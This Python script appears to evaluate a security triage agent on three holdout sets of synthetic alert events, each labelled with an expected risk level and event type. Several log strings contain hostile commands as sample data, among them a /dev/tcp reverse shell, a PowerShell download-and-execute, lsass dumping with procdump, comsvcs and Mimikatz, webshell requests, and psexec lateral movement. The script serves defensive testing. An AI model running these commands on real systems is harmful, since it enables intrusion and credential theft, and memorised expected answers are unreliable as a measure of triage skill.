"""独立 holdout 泛化评测（样本与评测集 data/evaluation_cases.json **零重合**）。

为什么需要这个脚本
------------------
此前 `scripts/_adversarial_audit.py` 里那 6 个「对抗样本」已被反向标准化成了评测集的
EVENT-011 / 012 / 013 / 015 / 016（内容逐字重合），因此「测试集外泛化 6/6」这一结论
**不再成立**——它们已经不是独立样本了。本脚本提供一份真正的 holdout：

- 主机名 / IP / 进程 / 日志措辞 / 手法家族全部与评测集不同；
- 期望值**先于**运行确定，依据 `docs/GRADING_STANDARD.md`（不针对模型输出反向调参）；
- 覆盖三类：误报降噪（FP）、攻击识别（ATK）、分级边界（EDGE）。

用法
----
    # 真 LLM 路径（需 DEEPSEEK_API_KEY）
    PYTHONPATH=. python scripts/_holdout_eval.py

    # 规则兜底路径（强制移除 key，零网络零成本）
    PYTHONPATH=. HOLDOUT_MODE=rules python scripts/_holdout_eval.py

输出：控制台逐条结果 + 汇总，并写 reports/holdout_<mode>.json。
"""
from __future__ import annotations

import json
import logging
import os
import sys
from pathlib import Path
from time import perf_counter

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from security_agent.console import use_utf8_stdio  # noqa: E402
use_utf8_stdio()  # 控制台编码无关性：英文 Windows 管道 stdout 是 cp1252，直写中文必崩

logging.getLogger("security_agent").setLevel(logging.ERROR)

MODE = os.environ.get("HOLDOUT_MODE", "llm").strip().lower()
if MODE == "rules":
    # 强制走规则兜底：无 key → ai_chat_json 返回 None → _heuristic_fallback
    os.environ.pop("DEEPSEEK_API_KEY", None)
    os.environ.pop("SECURITY_AGENT_LLM_API_KEY", None)

# ── holdout 样本（先定期望值，再跑） ─────────────────────────────
# 期望值依据 docs/GRADING_STANDARD.md：
#   critical = 不可逆损害已发生 / 高价值资产上的攻击 / 无用户交互的远程或自动执行链
#   high     = 攻击链已启动但未确认损害 / 需用户交互触发的执行链
#   low+误报 = 有合理解释的正常活动
HOLDOUT = [
    # ---------- FP：应判误报 / low ----------
    dict(
        hid="H-01", kind="FP",
        title="文件服务器触发 DLP 外发规则",
        severity="medium", source_ip="10.60.4.11", host="FS-BACKUP-02",
        user="svc_bk", process="veeam_agent.exe",
        behavior="备份代理在维护窗口内对文件服务器做增量备份，触发 DLP 外发规则。",
        raw_log="veeam_agent.exe routine backup incremental scheduled job; maintenance window; "
                "asset whitelisted; no credential access; no privilege escalation",
        destination_domain="", change_ticket="CHG-99110", tags=["backup", "routine", "whitelist"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="H-02", kind="FP",
        title="运维账号在审计路径内查看共享清单",
        severity="medium", source_ip="10.60.9.5", host="JUMP-03",
        user="ops_sun", process="net.exe",
        behavior="运维人员经堡垒机登录后，在本机只读列举共享清单，标注 routine check。",
        raw_log="bastion session audited; net view shared list enumerate local read-only; "
                "routine check; no share write; no admin$ access",
        destination_domain="", change_ticket="", tags=["routine"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="H-03", kind="FP",
        title="内部扫描器例行端口扫描",
        severity="low", source_ip="10.60.7.20", host="VULNSCAN-01",
        user="svc_scan", process="nmap.exe",
        behavior="内部漏扫平台按计划对网段执行例行扫描。",
        raw_log="nmap.exe scheduled scan internal segment; asset whitelisted; "
                "daily routine vulnerability scan; no exploit payload",
        destination_domain="", change_ticket="CHG-99111", tags=["scan", "routine", "whitelist"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="H-04", kind="FP",
        title="对账系统与业务网关的周期性加密通道",
        severity="low", source_ip="10.60.2.30", host="FIN-SVR-01",
        user="svc_recon", process="java.exe",
        behavior="对账作业与已备案业务网关建立周期性 TLS 通道。",
        raw_log="java.exe business api call reconcile; payment gateway approved peer; "
                "tls handshake periodic sync; no external unknown peer",
        destination_domain="gw.corp-internal.example", change_ticket="", tags=["business"],
        expect=("low", True, "误报"),
    ),
    # ---------- ATK：应判攻击 ----------
    dict(
        hid="H-05", kind="ATK",
        title="Linux 主机反弹 Shell",
        severity="critical", source_ip="10.60.5.77", host="APP-LNX-04",
        user="www-data", process="bash",
        behavior="Web 应用账号被利用后建立到外部主机的反弹 shell。",
        raw_log="bash -i >& /dev/tcp/203.0.113.99/4444 0>&1 ; reverse shell spawned by web user; "
                "unexpected outbound interactive session",
        destination_ip="203.0.113.99", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "恶意脚本执行"),
    ),
    dict(
        hid="H-06", kind="ATK",
        title="Web 目录落地可疑脚本并执行命令",
        severity="critical", source_ip="203.0.113.120", host="WEB-07",
        user="apache", process="httpd",
        behavior="Web 服务器出现新落地脚本文件并被带参访问执行命令。",
        raw_log="POST /upload/avatar.php HTTP/1.1 200; new file /var/www/html/avatar.php created; "
                "GET /upload/avatar.php?cmd=id; webshell interactive access",
        destination_ip="203.0.113.120", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "WebShell 攻击"),
    ),
    dict(
        hid="H-07", kind="ATK",
        title="文件服务器批量文件被加密改名",
        severity="critical", source_ip="", host="FS-DATA-03",
        user="svc_file", process="updater.exe",
        behavior="大量文档被追加加密后缀并生成勒索说明文件。",
        raw_log="updater.exe mass rename files suffix .crypt ; README_RESTORE.txt dropped in 214 folders ; "
                "ransom note present ; shadow copies deleted",
        destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "勒索软件加密"),
    ),
    dict(
        hid="H-08", kind="ATK",
        title="使用 procdump 转储 lsass 内存",
        severity="high", source_ip="10.60.8.14", host="WS-FIN-22",
        user="contractor_li", process="procdump.exe",
        behavior="非运维账号调用 procdump 转储 lsass 进程内存。",
        raw_log="procdump.exe -ma lsass.exe C:\\Users\\Public\\l.dmp ; lsass memory dump ; "
                "unsigned binary ; user is external contractor",
        destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "凭据转储"),
    ),
    dict(
        hid="H-09", kind="ATK",
        title="远程连接域控管理共享",
        severity="high", source_ip="10.60.8.90", host="DC-02",
        user="admin_dup", process="net.exe",
        behavior="来源为非授权主机的会话连接域控管理共享。",
        raw_log="net use \\\\DC-02\\admin$ /user:corp\\admin_dup ; Event 5140 network share object accessed ; "
                "source workstation not in admin group baseline",
        destination_ip="10.60.8.90", destination_domain="", change_ticket="", tags=[],
        expect=("high", False, "横向移动前置"),
    ),
    dict(
        hid="H-10", kind="ATK",
        title="终端对已知恶意域名周期性信标",
        severity="high", source_ip="10.60.6.55", host="WS-HR-31",
        user="hr_zhang", process="rundll32.exe",
        behavior="终端每 60 秒对同一外部域名发起固定长度 DNS 查询。",
        raw_log="rundll32.exe periodic dns query every 60s to update.medusac2.top ; "
                "intel hit malware-c2 beacon ; low jitter",
        destination_domain="update.medusac2.top", change_ticket="", tags=["beacon"],
        expect=("high", False, "异常外联"),
    ),
    dict(
        hid="H-11", kind="ATK",
        title="SSH 暴力破解后成功登录",
        severity="high", source_ip="198.51.100.7", host="SRV-DB-11",
        user="root", process="sshd",
        behavior="同一来源在短时间内产生大量认证失败后出现成功登录。",
        raw_log="sshd failed password for root count=418 from 198.51.100.7 ; "
                "subsequent accepted password for root ; brute force succeeded",
        destination_ip="198.51.100.7", destination_domain="", change_ticket="", tags=[],
        expect=("high", False, "异常登录"),
    ),
    # ---------- EDGE：分级边界 ----------
    dict(
        hid="H-12", kind="EDGE",
        title="Excel 附件打开后执行无窗口 PowerShell",
        severity="high", source_ip="", host="WS-MKT-08",
        user="mkt_zhao", process="excel.exe",
        behavior="用户打开外部 Excel 附件后，表格宏调用 cmd 启动无窗口 PowerShell 执行远程脚本。",
        raw_log="excel.exe open attachment quote.xlsm then spawn cmd.exe /c powershell -nop -w hidden -c "
                "IEX(New-Object Net.WebClient).DownloadString('http://cdn-update.example/x.ps1')",
        destination_domain="cdn-update.example", change_ticket="", tags=["macro-download", "ole_object"],
        expect=("high", False, "恶意脚本执行"),
    ),
    dict(
        hid="H-13", kind="EDGE",
        title="数据库主机上无交互的编码命令执行",
        severity="high", source_ip="10.60.1.6", host="DB-CORE-01",
        user="svc_db", process="powershell.exe",
        behavior="数据库主机上出现由网络侧直接下发、无任何用户交互前提的编码命令执行。",
        raw_log="powershell.exe -EncodedCommand JABzAD0A... ; executed via remote service creation ; "
                "no document carrier ; no interactive user session",
        destination_ip="10.60.1.6", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "恶意脚本执行"),
    ),
]


# ── holdout v2：**独立于 v1 的第二份样本** ─────────────────────
# 用途：v1 在修复过程中已被用作开发集（据其失败项修了 6 处引擎缺陷），
# 因此 v1 的满分**不能**再作为泛化证据。v2 用不同主机/IP/措辞与不同手法变体，
# 用于检验修复是否真的泛化。**期望值同样先于运行确定，不据结果回调。**
HOLDOUT_V2 = [
    dict(
        hid="V-01", kind="FP",
        title="数据库备份作业触发外传规则",
        severity="medium", source_ip="10.70.3.9", host="DB-BK-02",
        user="svc_dump", process="mysqldump.exe",
        behavior="备份窗口内对数据库执行例行全量转储并写入内部备份存储。",
        raw_log="mysqldump.exe routine full dump nightly backup to internal storage; "
                "maintenance window; asset whitelisted; no data exfiltration to external peer",
        destination_domain="", change_ticket="CHG-77120", tags=["backup", "routine", "whitelist"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="V-02", kind="FP",
        title="主机目录清单只读枚举",
        severity="low", source_ip="10.70.5.12", host="APP-SVR-05",
        user="ops_qin", process="cmd.exe",
        behavior="运维核查期间在本机只读列举目录与共享清单，全程无写入。",
        raw_log="cmd.exe dir /s read-only directory enumeration; operator share listing query; "
                "routine check; no file write; no admin share access",
        destination_domain="", change_ticket="", tags=["routine"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="V-03", kind="FP",
        title="对账平台周期性加密同步",
        severity="low", source_ip="10.70.2.18", host="ERP-APP-02",
        user="svc_sync", process="node.exe",
        behavior="对账服务与内部结算平台按计划同步，走已备案加密通道。",
        raw_log="node.exe scheduled sync to internal settlement platform; approved business api; "
                "tls handshake periodic reconcile; no unknown external peer",
        destination_domain="settle.corp-internal.example", change_ticket="", tags=["business"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="V-04", kind="FP",
        title="资产盘点扫描器例行运行",
        severity="low", source_ip="10.70.7.31", host="INVSCAN-02",
        user="svc_inv", process="masscan.exe",
        behavior="资产盘点平台按计划对网段执行例行扫描。",
        raw_log="masscan.exe scheduled scan internal asset inventory; asset whitelisted; "
                "daily routine; no exploit payload used",
        destination_domain="", change_ticket="CHG-77121", tags=["scan", "routine", "whitelist"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="V-05", kind="ATK",
        title="服务器上远程下发编码命令执行",
        severity="high", source_ip="10.70.1.44", host="SRV-APP-09",
        user="svc_app", process="powershell.exe",
        behavior="服务器上出现由远程服务创建下发的编码命令执行，无交互会话。",
        raw_log="powershell.exe -EncodedCommand SQBFAFgA... ; delivered by remote service creation ; "
                "no interactive session",
        destination_ip="10.70.1.44", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "恶意脚本执行"),
    ),
    dict(
        hid="V-06", kind="ATK",
        title="Web 服务器落地 aspx 脚本并被带参调用",
        severity="critical", source_ip="203.0.113.140", host="WEB-12",
        user="iis", process="w3wp.exe",
        behavior="Web 目录出现新落地脚本文件并被带参调用执行命令。",
        raw_log="/uploads/logo.aspx created; GET /uploads/logo.aspx?cmd=whoami 200; "
                "webshell interactive access",
        destination_ip="203.0.113.140", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "WebShell 攻击"),
    ),
    dict(
        hid="V-07", kind="ATK",
        title="共享目录文件被批量加密",
        severity="critical", source_ip="", host="NAS-01",
        user="svc_nas", process="encryptor.exe",
        behavior="共享目录内文件被批量追加加密后缀并生成解密说明。",
        raw_log="encryptor.exe mass encrypt files; suffix .locked; README_DECRYPT.txt written; "
                "ransomware note present",
        destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "勒索软件加密"),
    ),
    dict(
        hid="V-08", kind="ATK",
        title="使用系统自带二进制转储 LSASS",
        severity="high", source_ip="10.70.8.21", host="WS-OPS-15",
        user="intern_wu", process="rundll32.exe",
        behavior="实习账号调用系统二进制加载 comsvcs 转储 lsass 内存。",
        raw_log="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Windows\\Temp\\lsass.dmp full",
        destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "凭据转储"),
    ),
    dict(
        hid="V-09", kind="ATK",
        title="通过 WMIC 在远端主机创建服务",
        severity="high", source_ip="10.70.4.60", host="FS-CORP-02",
        user="admin_svc", process="wmic.exe",
        behavior="从非授权主机经 WMIC 在文件服务器上创建远程服务。",
        raw_log='wmic /node:FS-CORP-02 process call create "cmd /c whoami" ; lateral movement',
        destination_ip="10.70.4.60", destination_domain="", change_ticket="", tags=[],
        expect=("high", False, "横向移动前置"),
    ),
    dict(
        hid="V-10", kind="ATK",
        title="终端对可疑域名周期外联",
        severity="high", source_ip="10.70.6.77", host="WS-SALES-07",
        user="sales_hu", process="chrome.exe",
        behavior="终端以固定 30 秒间隔对同一外部域名发起外联。",
        raw_log="chrome.exe periodic connection beacon; fixed interval 30s; "
                "intel hit malware-c2",
        destination_domain="sync-cdn-telemetry.top", change_ticket="", tags=["beacon"],
        expect=("high", False, "异常外联"),
    ),
    dict(
        hid="V-11", kind="ATK",
        title="外部 IP 高频认证失败后登录成功",
        severity="high", source_ip="203.0.113.201", host="VPN-GW-01",
        user="vpn_user", process="login-process",
        behavior="同一外部来源产生大量认证失败后出现成功登录。",
        raw_log="Event 4625 failed to log on count=512 from 203.0.113.201 ; "
                "then Event 4624 logged on ; login attempt brute force",
        destination_ip="203.0.113.201", destination_domain="", change_ticket="", tags=[],
        expect=("high", False, "异常登录"),
    ),
    dict(
        hid="V-12", kind="EDGE",
        title="邮件附件打开后触发 PowerShell 下载",
        severity="high", source_ip="", host="WS-LEGAL-04",
        user="legal_xu", process="outlook.exe",
        behavior="用户打开外部邮件附件后，文档触发无窗口 PowerShell 下载远程脚本。",
        raw_log="outlook.exe open attachment notice.docm then spawn powershell -nop -w hidden "
                "downloadstring",
        destination_domain="cdn-update.example", change_ticket="", tags=["macro-download", "docm"],
        expect=("high", False, "恶意脚本执行"),
    ),
    dict(
        hid="V-13", kind="EDGE",
        title="核心业务主机上编码命令被远程执行",
        severity="high", source_ip="10.70.1.5", host="ERP-CORE-01",
        user="svc_erp", process="cmd.exe",
        behavior="核心业务主机上出现远程服务创建下发的编码命令执行，无人值守。",
        raw_log="cmd.exe /c powershell -EncodedCommand ZgBvAG8A... ; "
                "initiated by remote service creation ; unattended",
        destination_ip="10.70.1.5", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "恶意脚本执行"),
    ),
    dict(
        hid="V-14", kind="FP",
        title="例行巡检未发现凭据访问",
        severity="low", source_ip="10.70.9.8", host="WS-IOT-03",
        user="svc_check", process="check_tool.exe",
        behavior="例行安全巡检工具运行完毕，未发现凭据相关访问行为。",
        raw_log="check_tool.exe routine inspection; no mimikatz executed; no lsass memory access; "
                "no credential dump; asset whitelisted",
        destination_domain="", change_ticket="", tags=["routine", "whitelist"],
        expect=("low", True, "误报"),
    ),
]

HOLDOUT_SET = os.environ.get("HOLDOUT_SET", "v1").strip().lower()


# ── holdout v3：**冻结的诚实测量集** ──────────────────────────
# v1 与 v2 在修复过程中都已被用作开发集（据其失败项定位根因）。
# v3 独立撰写、**只跑不改**：无论结果好坏都直接计入报告，不据其回调任何规则或判据。
# 覆盖：误报降噪 4 / 攻击识别 7 / 分级边界 4（含「审计路径登录 → low 但不算误报」这类易错边界）。
HOLDOUT_V3 = [
    dict(
        hid="W-01", kind="FP",
        title="归档节点触发外发审计规则",
        severity="medium", source_ip="10.80.1.20", host="ARCH-NODE-03",
        user="svc_arch", process="rsync.exe",
        behavior="归档节点在维护窗口内向内部归档库同步冷数据，触发外发审计。",
        raw_log="rsync.exe routine archive sync to internal vault; maintenance window; "
                "asset whitelisted; no external peer; no credential touch",
        destination_domain="vault.corp-internal.example", change_ticket="CHG-83001",
        tags=["routine", "whitelist", "backup"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="W-02", kind="FP",
        title="运维主机只读盘点目录",
        severity="low", source_ip="10.80.2.7", host="OPS-WS-11",
        user="ops_ma", process="powershell.exe",
        behavior="运维核查期间在本机只读统计目录数量，未做任何写入或权限操作。",
        raw_log="powershell.exe routine check; enumerate directories read-only; "
                "no file write; no privilege escalation; no credential access",
        destination_domain="", change_ticket="", tags=["routine"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="W-03", kind="FP",
        title="内部结算通道按周期建立加密连接",
        severity="low", source_ip="10.80.3.5", host="SETTLE-SVR-01",
        user="svc_settle", process="java.exe",
        behavior="结算服务与内部记账系统按既定协议周期通信。",
        raw_log="java.exe approved business api; tls handshake periodic sync; "
                "internal accounting peer; no unknown external peer",
        destination_domain="acct.corp-internal.example", change_ticket="", tags=["business"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="W-04", kind="FP",
        title="终端基线巡检未命中危险行为",
        severity="low", source_ip="10.80.4.9", host="WS-ADM-02",
        user="svc_agent", process="agent.exe",
        behavior="终端基线巡检完成，未命中凭据转储与横向移动相关行为。",
        raw_log="agent.exe routine baseline inspection; no mimikatz; no lsass access; "
                "no psexec; asset whitelisted",
        destination_domain="", change_ticket="", tags=["routine", "whitelist"],
        expect=("low", True, "误报"),
    ),
    dict(
        hid="W-05", kind="ATK",
        title="主机被远程服务下发执行编码命令",
        severity="high", source_ip="10.80.5.30", host="APP-SVR-16",
        user="svc_deploy", process="powershell.exe",
        behavior="主机收到远程服务创建下发的编码命令并直接执行。",
        raw_log="powershell.exe -EncodedCommand QQBkAGQA... ; via remote service creation ; "
                "attended by no user",
        destination_ip="10.80.5.30", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "恶意脚本执行"),
    ),
    dict(
        hid="W-06", kind="ATK",
        title="Web 目录出现可交互脚本文件",
        severity="critical", source_ip="198.51.100.60", host="WEB-21",
        user="tomcat", process="java",
        behavior="Web 目录新增脚本文件，并可经参数直接执行系统命令。",
        raw_log="new file /opt/tomcat/webapps/ROOT/dbg.jsp created; "
                "GET /dbg.jsp?cmd=whoami returned 200; webshell interactive",
        destination_ip="198.51.100.60", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "WebShell 攻击"),
    ),
    dict(
        hid="W-07", kind="ATK",
        title="文件服务器出现勒索说明文件",
        severity="critical", source_ip="", host="FS-HR-04",
        user="svc_hr", process="svchost.exe",
        behavior="大量文档被加密改名，目录中出现勒索说明文件。",
        raw_log="svchost.exe abnormal mass rename; suffix .encrypted; README_DECRYPT.txt present; "
                "ransomware note; shadow copies removed",
        destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "勒索软件加密"),
    ),
    dict(
        hid="W-08", kind="ATK",
        title="非特权账号读取凭据内存",
        severity="high", source_ip="10.80.6.44", host="WS-CONTRACT-01",
        user="extern_gu", process="powershell.exe",
        behavior="外部驻场账号尝试读取凭据内存区。",
        raw_log="powershell.exe Invoke-Mimikatz sekurlsa::logonpasswords; "
                "lsass access; non-privileged account",
        destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "凭据转储"),
    ),
    dict(
        hid="W-09", kind="ATK",
        title="利用远程服务创建横向移动",
        severity="high", source_ip="10.80.7.12", host="APP-SVR-22",
        user="admin_dup2", process="psexec.exe",
        behavior="从非管理主机向应用服务器创建远程服务。",
        raw_log="psexec.exe \\\\APP-SVR-22 -s cmd.exe ; remote service creation ; "
                "source host not in admin baseline",
        destination_ip="10.80.7.12", destination_domain="", change_ticket="", tags=[],
        expect=("high", False, "横向移动前置"),
    ),
    dict(
        hid="W-10", kind="ATK",
        title="主机定期回连可疑控制端",
        severity="high", source_ip="10.80.8.19", host="WS-DEV-33",
        user="dev_song", process="svchost.exe",
        behavior="主机以固定间隔回连外部控制端，情报库判定域名恶意。",
        raw_log="svchost.exe fixed interval outbound beacon; destination known malware-c2; "
                "low jitter",
        destination_domain="cdn-ops-relay.top", change_ticket="", tags=["beacon"],
        expect=("high", False, "异常外联"),
    ),
    dict(
        hid="W-11", kind="ATK",
        title="同源 IP 大规模认证失败",
        severity="high", source_ip="203.0.113.222", host="WEB-05",
        user="admin", process="sshd",
        behavior="单一来源对管理账号产生大量认证失败并出现成功登录。",
        raw_log="sshd failed password for admin count=930 from 203.0.113.222 ; "
                "then accepted password ; brute force succeeded",
        destination_ip="203.0.113.222", destination_domain="", change_ticket="", tags=[],
        expect=("high", False, "异常登录"),
    ),
    dict(
        hid="W-12", kind="EDGE",
        title="办公文档宏触发脚本解释器",
        severity="high", source_ip="", host="WS-FIN-27",
        user="fin_geng", process="winword.exe",
        behavior="用户打开外部文档，宏调用解释器下载并运行远程脚本。",
        raw_log="winword.exe open doc then spawn cscript downloadstring macro-download ole_object",
        destination_domain="doc-cdn.example", change_ticket="", tags=["macro-download", "docm"],
        expect=("high", False, "恶意脚本执行"),
    ),
    dict(
        hid="W-13", kind="EDGE",
        title="无线程交互的远程编码命令落地核心库",
        severity="high", source_ip="10.80.1.3", host="DB-CORE-07",
        user="svc_db", process="wscript.exe",
        behavior="核心库主机上由网络侧直接下发编码命令执行，全程无用户会话。",
        raw_log="wscript.exe -EncodedCommand JABhAGIA... ; executed via remote service ; "
                "no interactive user session",
        destination_ip="10.80.1.3", destination_domain="", change_ticket="", tags=[],
        expect=("critical", False, "恶意脚本执行"),
    ),
    dict(
        hid="W-14", kind="EDGE",
        title="夜间批量导出客户表（持变更单）",
        severity="medium", source_ip="", host="DB-RPT-01",
        user="svc_rpt", process="pg_dump.exe",
        behavior="夜间批量导出客户表并压缩上传至外部对象存储，作业关联变更单。",
        raw_log="pg_dump.exe select * from customer_table; export customer rows; "
                "upload to s3 external-bucket; gzip",
        destination_domain="external-bucket.s3.amazonaws.com", change_ticket="CHG-83002", tags=[],
        expect=("high", False, "数据渗出"),
    ),
    dict(
        hid="W-15", kind="EDGE",
        title="运维审计系统记录的跳板登录",
        severity="medium", source_ip="10.80.9.1", host="BASTION-02",
        user="auditor2", process="ssh.exe",
        behavior="审计系统记录运维人员从内部网段跳转至生产网段并成功登录。",
        raw_log="Event 4624 logged on; user=auditor2; host=BASTION-02; src=10.80.9.1; "
                "process=ssh.exe; audited jump path",
        destination_ip="10.80.99.8", destination_domain="", change_ticket="", tags=[],
        expect=("low", False, "异常登录"),
    ),
]

_SETS = {"v1": HOLDOUT, "v2": HOLDOUT_V2, "v3": HOLDOUT_V3}
SAMPLES = _SETS.get(HOLDOUT_SET, HOLDOUT)


def _run(app, client) -> int:
    from security_agent.agent.models import SecurityEvent

    rows = []
    hits = 0
    for spec in SAMPLES:
        evt = SecurityEvent(
            id=spec["hid"],
            title=spec["title"],
            severity=spec["severity"],
            source_ip=spec["source_ip"],
            host=spec["host"],
            user=spec["user"],
            process=spec["process"],
            behavior=spec["behavior"],
            raw_log=spec["raw_log"],
            destination_ip=spec.get("destination_ip", ""),
            destination_domain=spec.get("destination_domain", ""),
            change_ticket=spec.get("change_ticket", ""),
            tags=spec.get("tags", []),
        )
        t0 = perf_counter()
        try:
            res = app._triage(evt).to_dict()
            error = ""
        except Exception as exc:  # noqa: BLE001
            res, error = {}, f"{type(exc).__name__}: {exc}"
        ms = round((perf_counter() - t0) * 1000, 1)

        exp_risk, exp_fp, exp_type = spec["expect"]
        act_risk = res.get("risk_level", "")
        act_fp = res.get("is_false_positive")
        act_type = res.get("event_type", "")
        ok = (act_risk == exp_risk) and (act_fp == exp_fp) and (act_type == exp_type)
        hits += int(ok)
        rows.append(dict(
            hid=spec["hid"], kind=spec["kind"], title=spec["title"],
            expected=dict(risk=exp_risk, fp=exp_fp, type=exp_type),
            actual=dict(risk=act_risk, fp=act_fp, type=act_type,
                        decision=res.get("prefilter_decision", ""),
                        confidence=res.get("confidence", "")),
            risk_match=act_risk == exp_risk,
            fp_match=act_fp == exp_fp,
            type_match=act_type == exp_type,
            pass_=ok, duration_ms=ms, error=error,
        ))
        flag = "PASS" if ok else "FAIL"
        print("[%s] %-5s %-8s exp=%-8s/%-5s/%-12s act=%-8s/%-5s/%-12s %.0fms"
              % (flag, spec["hid"], spec["kind"], exp_risk, exp_fp, exp_type,
                 act_risk, act_fp, act_type, ms))
        if error:
            print("        ERROR:", error)

    total = len(rows)
    fp_rows = [r for r in rows if r["kind"] == "FP"]
    atk_rows = [r for r in rows if r["kind"] in ("ATK", "EDGE")]
    summary = dict(
        mode=MODE, sample_set=HOLDOUT_SET, total=total, passed=hits,
        pass_rate=round(hits / total, 4) if total else 0.0,
        noise_accuracy=round(sum(r["pass_"] for r in fp_rows) / len(fp_rows), 4) if fp_rows else 0.0,
        attack_accuracy=round(sum(r["pass_"] for r in atk_rows) / len(atk_rows), 4) if atk_rows else 0.0,
        missed_attacks=sum(1 for r in atk_rows if r["actual"]["fp"] is True),
        false_alarms=sum(1 for r in fp_rows if r["actual"]["fp"] is False),
        llm_usage=(client.get_usage_stats() if client else {}),
    )
    print("\n" + "=" * 74)
    print("HOLDOUT set=%s mode=%s  pass=%d/%d (%.3f)  noise=%.3f  attack=%.3f  "
          "漏报=%d  误报失效=%d"
          % (HOLDOUT_SET, summary["mode"], hits, total, summary["pass_rate"],
             summary["noise_accuracy"], summary["attack_accuracy"],
             summary["missed_attacks"], summary["false_alarms"]))
    print("FAILS:", [r["hid"] for r in rows if not r["pass_"]])
    if client:
        print("llm_usage:", summary["llm_usage"])

    out = ROOT / "reports" / f"holdout_{HOLDOUT_SET}_{MODE}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(dict(summary=summary, cases=rows), ensure_ascii=False, indent=2),
                   encoding="utf-8")
    print("written:", out)
    return 0


def main() -> int:
    from security_agent.app import build_app

    try:
        import security_agent.ai.client as client
        client.reset_usage_stats()
    except Exception:
        client = None

    app = build_app()
    # 记忆**读写双向隔离**：与线上评测共用同一实现（见 SecurityAgent.evaluation_sandbox）。
    # 不隔离时本脚本自身的裁决会写入 triage_history.jsonl，并被后续运行按同主机检索
    # 回注提示词，使测量结果随运行次数漂移；存量记忆同样会干扰本轮读数。
    with app.evaluation_sandbox():
        return _run(app, client)


if __name__ == "__main__":
    raise SystemExit(main())
